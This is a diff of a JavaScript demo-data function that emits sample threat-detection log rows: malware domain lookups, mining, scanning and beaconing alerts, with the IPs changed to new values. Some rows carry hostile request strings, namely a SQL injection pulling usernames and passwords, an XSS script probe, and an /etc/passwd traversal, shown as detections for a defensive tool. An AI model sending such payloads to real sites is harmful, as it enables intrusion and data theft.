     '"2024-01-11 11:06:16.642375" r2d2 2.200.104.184 64597 108.162.193.114 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 11:06:27.976926" r2d2 2.200.110.232 64048 2.200.107.169 53 UDP DNS (www.storenike99).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 11:06:57.936616" r2d2 2.200.97.19 50948 198.11.136.14 80 TCP HTTP "amdc.aliexpress.com(/amdc/mobiledispatch?appkey=21371601&deviceid=xwey2p8xaoadap2xbkgrsm7d&platform=android&v=4.0 \\(POST mnc=wifi&lng=0.0&netType=WIFI&bssid=c8%3Ab5%3Aad%3Aee%3A21%3Ae0&sign=cad87772f4a5e7c71466eecc11a4977973ea389a&sid=879929153&carrier=wifi&cv=-1&t=1610359615280&platformVersion=8.0.0&domain=amdc.aliexpress.com&signType=sec&lat=0.0\\))" "potential data leakage (suspicious)" (heuristic)\n' +
-    '"2024-01-11 11:07:06.367406" r2d2 10.2.120.16 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 11:07:06.367406" r2d2 10.43.192.103 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:07:55.058745" r2d2 2.200.97.1 56719 8.8.8.8 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 11:08:59.618096" r2d2 2.200.107.146 3371 204.16.253.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 11:09:09.477083" r2d2 2.200.105.140 27496 93.184.221.240 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
@@ -1416,7 +1416,7 @@ function getDemoCSV() {
     '"2024-01-11 11:09:59.624072" r2d2 2.200.110.232 64471 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 11:10:01.872263" r2d2 2.200.110.233 63803 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 11:10:57.479865" r2d2 2.200.104.184 61786 205.251.192.236 53 UDP DNS juronu.com "pua (suspicious)" (static)\n' +
-    '"2024-01-11 11:11:10.049386" r2d2 10.2.120.16 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 11:11:10.049386" r2d2 10.43.192.103 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 11:12:11.107000" r2d2 10.124.72.52 3457 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 11:12:28.405691" r2d2 10.48.192.193 57686 10.1.194.234 53 UDP DNS (faithfulfacultativeladder).com "long domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:12:30.552811" r2d2 2.200.110.232 65501 2.200.107.168 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
@@ -1435,7 +1435,7 @@ function getDemoCSV() {
     '"2024-01-11 11:18:01.216350" r2d2 10.124.72.52 3513 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 11:18:04.411580" r2d2 2.200.97.1 52517 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 11:18:12.063717" r2d2 2.200.110.232 63800 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 11:18:31.079032" r2d2 2.200.104.32 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
+    '"2024-01-11 11:18:31.079032" r2d2 10.124.72.52 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:18:54.374892" r2d2 10.43.192.103 59620 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 11:19:19.099079" r2d2 2.200.110.233 63502 2.200.107.168 53 UDP DNS (2td6).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 11:20:11.732943" r2d2 10.43.192.103 59644 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
@@ -1449,7 +1449,7 @@ function getDemoCSV() {
     '"2024-01-11 11:24:11.183537" r2d2 2.200.107.146 17848 194.169.218.108 53 UDP DNS (booksearch).icu "domain (suspicious)" (static)\n' +
     '"2024-01-11 11:24:44.315743" r2d2 2.200.110.233 63944 2.200.107.168 53 UDP DNS monerohash.com "crypto mining (suspicious)" "(static) (+github.com/Hestat)"\n' +
     '"2024-01-11 11:25:25.439655" r2d2 2.200.110.232 63948 2.200.107.169 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
-    '"2024-01-11 11:25:27.108987" r2d2 2.200.104.32 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 11:25:27.108987" r2d2 10.124.72.52 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:25:59.742061" r2d2 10.3.160.42 28461 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 11:26:22.259597" r2d2 2.200.107.146 24471 194.62.182.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 11:27:32.326569" r2d2 2.200.110.233 63328 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -1463,7 +1463,7 @@ function getDemoCSV() {
     '"2024-01-11 11:30:19.338158" r2d2 10.124.72.51 4076 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 11:30:35.439104" r2d2 10.43.192.103 60216 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 11:31:12.040783" r2d2 2.200.107.146 40745 172.64.32.100 53 UDP DNS (api).ipstack.com "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 11:31:35.081106" r2d2 2.200.110.232 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 11:31:35.081106" r2d2 10.128.3.51 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:31:47.303777" r2d2 2.200.104.184 61972 216.239.38.110 53 UDP DNS (int.search).myway.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 11:32:00.009739" r2d2 10.3.160.42 28464 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 11:32:10.052082" r2d2 2.200.110.232 64126 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
@@ -1473,7 +1473,7 @@ function getDemoCSV() {
     '"2024-01-11 11:34:14.964398" r2d2 2.200.107.146 59326 212.18.249.54 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 11:34:14.991326" r2d2 2.200.110.233 63790 2.200.107.169 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 11:34:25.742793" r2d2 10.2.6.51 64688 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 11:34:32.645165" r2d2 10.3.160.42 - 185.220.101.47 - ICMP IP 185.220.101.47 "wannacry (malware)" (static)\n' +
+    '"2024-01-11 11:34:32.645165" r2d2 10.3.160.42 - 192.0.2.66 - ICMP IP 192.0.2.66 "wannacry (malware)" (static)\n' +
     '"2024-01-11 11:34:39.248768" r2d2 10.43.192.103 60286 213.252.245.223 457 TCP IPORT 213.252.245.223:457 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 11:34:43.384761" r2d2 2.200.110.232 64880 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 11:34:58.443107" r2d2 8.8.8.8 53 2.200.107.248 11477 UDP DNS (360.almari).io "parked site (suspicious)" (heuristic)\n' +
@@ -1489,7 +1489,7 @@ function getDemoCSV() {
     '"2024-01-11 11:40:08.748125" r2d2 10.43.192.103 60434 213.252.245.223 457 TCP IPORT 213.252.245.223:457 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 11:40:22.687876" r2d2 2.200.107.146 47404 194.62.182.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 11:40:56.944492" r2d2 10.43.192.103 60444 213.252.245.223 457 TCP IPORT 213.252.245.223:457 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 11:41:09.874434" r2d2 2.200.110.232 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
+    '"2024-01-11 11:41:09.874434" r2d2 10.128.3.52 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:41:15.015707" r2d2 10.43.192.103 60447 213.252.245.223 457 TCP IPORT 213.252.245.223:457 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 11:41:21.594610" r2d2 2.200.104.184 51320 13.107.4.50 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:41:26.625842" r2d2 2.200.104.184 51320 13.107.4.50 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
@@ -1504,7 +1504,7 @@ function getDemoCSV() {
     '"2024-01-11 11:45:35.413225" r2d2 2.200.104.32 51035 13.107.4.50 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:45:36.418170" r2d2 2.200.104.32 51035 13.107.4.50 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:45:36.667980" r2d2 192.168.30.247 51035 13.107.4.50 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 11:45:45.374332" r2d2 10.2.120.16 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 11:45:45.374332" r2d2 10.124.72.51 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 11:46:07.000099" r2d2 2.200.215.188 62983,63586,63984,64401 2.200.104.9,2.200.106.62,2.200.107.196,2.200.109.67 445 TCP PORT 445 "potential infection" (heuristic)\n' +
     '"2024-01-11 11:46:07.000106" r2d2 2.200.215.188 62867 2.200.103.151 445 TCP PORT 445 "potential infection" (heuristic)\n' +
     '"2024-01-11 11:46:19.000085" r2d2 2.200.215.186 64754 2.200.110.155 445 TCP PORT 445 "potential infection" (heuristic)\n' +
@@ -1543,7 +1543,7 @@ function getDemoCSV() {
     '"2024-01-11 11:56:06.590335" r2d2 2.200.109.252 51383 2.23.97.219 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:56:06.590335" "dmz probe" 2.200.109.252 51383 2.23.97.219 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:57:11.185500" r2d2 10.124.72.51 4475 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
-    '"2024-01-11 11:57:40.831704" r2d2 2.200.104.32 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 11:57:40.831704" r2d2 10.128.8.51 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:57:50.229856" r2d2 2.200.107.146 63267 52.58.214.33 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 11:59:00.985948" r2d2 2.200.105.140 19238 69.16.175.10 80 TCP UA "NSIS_Inetc( \\(Mozilla\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 11:59:03.916680" r2d2 2.200.105.140 36696 69.16.175.10 80 TCP UA "NSIS_Inetc( \\(Mozilla\\))" "user agent (suspicious)" (heuristic)\n' +
@@ -1551,7 +1551,7 @@ function getDemoCSV() {
     '"2024-01-11 12:00:04.518738" r2d2 10.3.160.42 28211 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:00:05.222611" r2d2 10.3.160.42 28211 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:01:09.908911" r2d2 2.200.107.146 13300 108.162.193.249 53 UDP DNS (tracker.iamhansen).xyz "domain (suspicious)" (static)\n' +
-    '"2024-01-11 12:02:47.983835" r2d2 10.2.120.16 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:02:47.983835" r2d2 10.124.72.51 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:04:02.000248" r2d2 2.200.108.59 24908,32838,32974,33400,34168,34176,34306,34688,35344,36260,36424,37068,37806,37868,37890,38356,38710,39376,39676,39712,39936,40370,41560,41658,41800,42868,43434,43604,43658,43916,44212,44646,44770,45318,45790,45818,46030,46300,47104,47360,47400,47690,48012,48132,48166,48542,48604,49392,50032,50230,50366,50444,50624,50686,50700,50942,51240,51780,52114,52280,52356,52400,52598,52808,53054,53790,54102,55046,55122,55524,55540,55810,55932,56478,56544,56724,56956,57050,57210,57262,57414,58318,59214,60220,60356 77.53.81.105 21,6804,7036,7939,8277,9824,10684,11063,13031,14077,15289,15294,15374,15556,15983,16614,18383,19864,23264,25636,25990,26499,27040,27121,27409,28072,28767,29029,30657,30759,30848,32015,32614,32688,32918,33084,33549,33558,33788,34818,35113,35262,37152,37977,38087,39129,39378,39949,40706,41442,41502,41638,42723,43039,43080,44064,44242,45004,45117,45451,45881,46011,47809,48153,49774,49986,50649,51982,53006,53641,54445,54595,55289,55374,57613,57678,60691,61106,62598,62838,63265,63590,63725,64010,65208 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 12:04:08.000178" r2d2 2.200.108.59 24908,33204,33400,33652,33862,34306,34362,34398,34416,34532,34852,35240,35344,35990,36030,36068,36260,36346,36424,36556,36840,37310,37868,37912,38690,38768,38914,39158,39320,39322,39352,39376,39538,39712,40144,40564,40692,40762,41024,41968,42296,42788,43096,43130,43328,44098,44770,44776,45746,45984,46398,46772,46984,47690,48158,48574,49028,49278,49348,49524,49760,49788,50032,50088,50198,50226,50834,51364,51808,51954,51974,52096,52202,52280,52664,52688,53012,53172,53612,53788,53796,54178,54390,54900,55100,55120,55122,55296,55390,55810,55904,57194,57234,57508,57936,58178,58318,58916,59170,59282,59534,60054,60314,60356,60860 77.53.81.105 21,6020,6107,6906,7916,8277,9359,9422,9509,10612,12555,13163,15521,15840,16070,16172,16455,17230,17828,17881,18284,18340,18383,19207,19757,19864,20292,20499,21569,21904,24216,24526,24547,24951,25663,25720,25800,26549,26900,26943,27040,27818,28072,28380,28767,29088,29685,30490,30727,32037,32364,32742,33549,33976,34789,34797,35092,35262,35535,35553,35883,36481,36513,37410,37603,37977,39801,40320,40421,41442,41502,41737,43056,43062,43565,44064,44596,45117,45165,46093,46247,46490,46538,47228,47809,48105,50933,51198,51275,52747,53006,53206,53232,54548,55373,57377,59152,60016,60323,60400,60510,61045,63265,63814,64482,64553 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 12:04:16.479751" r2d2 10.128.8.51 50347 63.251.235.71 80 TCP URL disorderstatus.ru/order.php "andromeda (malware)" (static)\n' +
@@ -1573,11 +1573,11 @@ function getDemoCSV() {
     '"2024-01-11 12:08:24.322935" r2d2 2.200.110.233 63872 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 12:08:30.879878" r2d2 2.200.110.232 64583 2.200.107.168 53 UDP DNS (myphone-download.wondershare).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 12:09:06.106827" r2d2 2.200.110.233 64975 2.200.107.168 53 UDP DNS lowtyroguer.com "ek router (malicious)" (static)\n' +
-    '"2024-01-11 12:09:26.312708" r2d2 10.2.120.16 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:09:26.312708" r2d2 10.43.192.103 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:09:52.634448" r2d2 10.20.100.51 63987 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:09:58.446094" r2d2 2.200.107.146 37032 205.251.193.194 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 12:09:59.739706" r2d2 2.200.104.32 54900 93.184.221.240 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 12:11:00.661285" r2d2 10.3.160.42 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 12:11:00.661285" r2d2 10.2.120.16 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 12:11:10.681878" r2d2 2.200.104.184 49769 192.26.92.30 53 UDP DNS freegeoip.net "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:11:10.846532" r2d2 2.200.104.184 49547 72.5.161.7 80 TCP IP 72.5.161.7 "sinkhole bitsight (malware)" (static)\n' +
     '"2024-01-11 12:11:53.846710" r2d2 2.200.106.65 54332 2.200.107.169 53 UDP DNS (postlmg).cc "domain (suspicious)" (static)\n' +
@@ -1589,21 +1589,21 @@ function getDemoCSV() {
     '"2024-01-11 12:13:04.435184" r2d2 2.200.110.233 65435 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 12:13:36.120134" r2d2 2.200.107.168 53 2.200.109.170 13005 UDP DNS (coltagainst).pro "parked site (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:13:56.556025" r2d2 2.200.105.226 58206 208.67.222.123 53 UDP DNS (pro).ip-api.com "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 12:14:03.917097" r2d2 10.2.120.16 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:14:03.917097" r2d2 10.124.72.51 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:14:07.894838" r2d2 10.3.160.42 30158 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:14:09.394019" r2d2 10.3.160.42 30158 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 12:14:10.148069" r2d2 2.200.110.233 49158 2.200.107.168 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
     '"2024-01-11 12:14:10.150588" r2d2 2.200.107.146 25933 156.154.127.70 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
     '"2024-01-11 12:14:24.252200" r2d2 10.128.8.51 50413 63.251.235.71 80 TCP URL disorderstatus.ru/order.php "andromeda (malware)" (static)\n' +
-    '"2024-01-11 12:15:40.669654" r2d2 10.3.160.42 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:15:40.669654" r2d2 10.3.160.42 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:16:10.306779" r2d2 10.124.201.49 59642 37.48.82.67 80 TCP UA "XxX (@_dDuz4iGNOb15fRNKcw3YAlZ_l-WynIKgMHJEvytE0V6OWPyIPOJGYl_9kZR-iaDIxa7tU2Z6VsPEiRekgFdBkHDwCI-sEvHWlNdhHRp9A8QIM8HY37aA_2R0OZQ9sQQQYWGK0XVYWOmtChwrKs29L5XYB1dgh5Fj3xK6LKlOvLXWcdbDOQ70B96pm4Ut7EqQZ83Yrw4ZNrVRAYclvHLtlQB0tOnfI0SjXIdnkztzjbrm--iwHh7b6xsOuZKYTuva0VfrpBzu7JyDXxXwSxLPURwQpXr8f1AuuFHGE9EyiovPqFH-V-5VntvASPuWaw9rNgaocMg_8HFjkCYxAzrFeMO30KOSfWf0ppU2qkyWiH=)" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:16:29.563042" r2d2 2.200.107.146 57207 185.24.64.42 53 UDP DNS (2td6).xyz "domain (suspicious)" (static)\n' +
-    '"2024-01-11 12:17:11.743669" r2d2 2.200.104.32 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:17:11.743669" r2d2 10.124.72.52 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:17:43.395665" r2d2 2.200.110.232 64042 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 12:17:56.524195" r2d2 2.200.104.184 62351 200.33.111.1 53 UDP DNS (ma).tt "domain (suspicious)" (static)\n' +
     '"2024-01-11 12:17:57.796545" r2d2 2.200.107.146 54573 205.251.194.217 53 UDP DNS (vio-ck-zvdnggdkkp).dynamic-m.com "dynamic domain (suspicious)" (static)\n' +
     '"2024-01-11 12:18:08.179117" r2d2 10.3.160.42 30160 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 12:18:27.484889" r2d2 2.200.104.32 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:18:27.484889" r2d2 10.128.8.51 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:19:17.626480" r2d2 2.200.109.177 33027 208.91.197.46 80 TCP IP 208.91.197.46 "parking site (suspicious)" (static)\n' +
     '"2024-01-11 12:19:20.624721" r2d2 2.200.109.177 33027 208.91.197.46 80 TCP IP 208.91.197.46 "parking site (suspicious)" (static)\n' +
     '"2024-01-11 12:19:20.652882" r2d2 10.6.120.51 63799 10.1.20.50 53 UDP DNS tbapi.search.ask.com "pua (suspicious)" (static)\n' +
@@ -1630,11 +1630,11 @@ function getDemoCSV() {
     '"2024-01-11 12:26:10.122509" r2d2 10.1.192.180 80 10.2.21.49 58491 TCP HTTP application/x-sh "content type (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:26:56.061871" r2d2 192.168.136.51 33452 198.11.136.14 80 TCP HTTP "amdc.aliexpress.com(/amdc/mobiledispatch?appkey=21371601&deviceid=xuhpg1dxegkdaoi5sczelwtb&platform=android&v=4.0 \\(POST appVersion=8.22.1&mnc=wifi&lng=0.0&netType=WIFI&bssid=02%3A00%3A00%3A00%3A00%3A00&appName=Aliexpress_Android&channel=channel_name&sign=04820996331c6fab668faec2dca473ed2b303695&carrier=wifi&cv=0&t=1610364415247&platformVersion=9&domain=amdc.aliexpress.com&signType=sec&lat=0.0\\))" "potential data leakage (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:27:07.873181" r2d2 2.200.107.146 40368 173.245.58.51 53 UDP DNS geolocation-db.com "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 12:27:22.990919" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 12:27:22.990919" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 12:27:27.516621" r2d2 2.200.108.101 54850 2.200.107.168 53 UDP DNS (nationsflushedoccasionally).com "long domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:27:37.348994" r2d2 2.200.104.184 61652 194.169.218.42 53 UDP DNS (vast.yomeno).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 12:28:09.327357" r2d2 10.3.160.42 30165 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 12:28:33.223094" r2d2 2.200.110.232 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:28:33.223094" r2d2 10.128.3.52 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:29:08.032468" r2d2 2.200.110.232 49331 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 12:29:17.141506" r2d2 2.200.110.233 64392 2.200.107.169 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
     '"2024-01-11 12:30:13.068911" r2d2 2.200.107.146 27042 194.62.183.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -1660,9 +1660,9 @@ function getDemoCSV() {
     '"2024-01-11 12:38:47.887917" r2d2 2.200.107.146 56536 199.59.242.141 53 UDP IP "199.59.242.141 (www.budi.in)" "parking site (suspicious)" (static)\n' +
     '"2024-01-11 12:38:59.683204" r2d2 2.200.107.146 16336 52.58.214.33 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 12:40:38.485533" r2d2 2.200.110.233 63903 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 12:40:49.371546" r2d2 10.3.160.42 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:40:49.371546" r2d2 10.2.120.16 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:40:57.834884" r2d2 2.200.110.233 65442 2.200.107.168 53 UDP DNS monerohash.com "crypto mining (suspicious)" "(static) (+github.com/Hestat)"\n' +
-    '"2024-01-11 12:41:31.962271" r2d2 10.2.120.16 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
+    '"2024-01-11 12:41:31.962271" r2d2 10.124.72.51 50011 203.0.113.16 80 TCP HTTP http://proxycheck.example/ "potential proxy probe (suspicious)" (heuristic)\n' +
     '"2024-01-11 12:41:41.592602" r2d2 2.200.110.233 54986 2.200.107.168 53 UDP DNS (tracepath).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 12:41:43.910765" r2d2 2.200.107.146 46435 205.251.196.58 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 12:41:52.066250" r2d2 2.200.110.232 63401 2.200.107.168 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
@@ -1689,17 +1689,17 @@ function getDemoCSV() {
     '"2024-01-11 12:49:58.699831" r2d2 2.200.110.233 64615 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 12:50:06.161176" r2d2 2.200.108.59 28199 2.200.240.54 53 UDP DNS tbapi.search.ask.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 12:50:06.161180" r2d2 2.200.108.59 28199 2.200.240.54 53 UDP DNS tbapi.search.ask.com "pua (suspicious)" (static)\n' +
